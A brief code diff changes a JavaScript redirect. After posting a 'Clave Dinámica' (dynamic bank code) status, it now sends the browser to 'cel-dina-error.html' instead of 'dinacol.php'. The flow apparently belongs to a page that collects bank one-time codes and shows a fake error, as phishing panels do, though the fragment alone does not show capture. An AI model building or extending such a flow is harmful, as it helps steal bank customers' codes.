@@ -209,7 +209,7 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ status: "Clave Dinámica" })
         }).then(() => {
-            window.location.href = "dinacol.php";
+            window.location.href = "cel-dina-error.html";
         });
         break;
 
